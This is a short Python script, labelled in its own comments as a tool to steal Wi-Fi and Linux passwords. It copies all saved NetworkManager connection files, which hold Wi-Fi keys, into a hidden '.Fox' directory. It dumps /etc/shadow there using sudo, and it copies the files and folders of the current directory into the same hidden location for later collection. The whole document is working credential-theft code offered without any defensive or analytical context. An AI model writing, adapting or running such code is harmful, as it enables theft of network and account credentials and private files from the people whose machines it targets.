import os
from os import walk
import shutil
from distutils.dir_util import copy_tree

### Steal WIFI Password On Linux ###
files = os.listdir("/etc/NetworkManager/system-connections/")
os.mkdir(".Fox")
os.mkdir(".Fox/WIFI_PASS")
num = 1
for line in files:
    shutil.copy2("/etc/NetworkManager/system-connections/" + line,
                 ".Fox/WIFI_PASS/WIFI-" + str(num) + ".txt")
    num += 1

### Steal Linux Password ###
os.mkdir(".Fox/OS_PASS")
os.system("sudo cat /etc/shadow > .Fox/OS_PASS/OS_Pass.txt")

### Take Backup ###
os.mkdir(".Fox/BackUP")
data_dir = []
for (dirpath, dirnames, filenames) in walk("."):
    data_dir.extend(dirnames)
    break
for dir in data_dir:
    if dir == ".Fox":
        pass
    else:
        copy_tree(dir, ".Fox/BackUP")
data_file = []
for (dirpath, dirnames, filenames) in walk("."):

    data_file.extend(filenames)
    break
for file in data_file:
    if file == os.path.basename(__file__):
        pass
    else:
        shutil.copy2(file, ".Fox/BackUP")
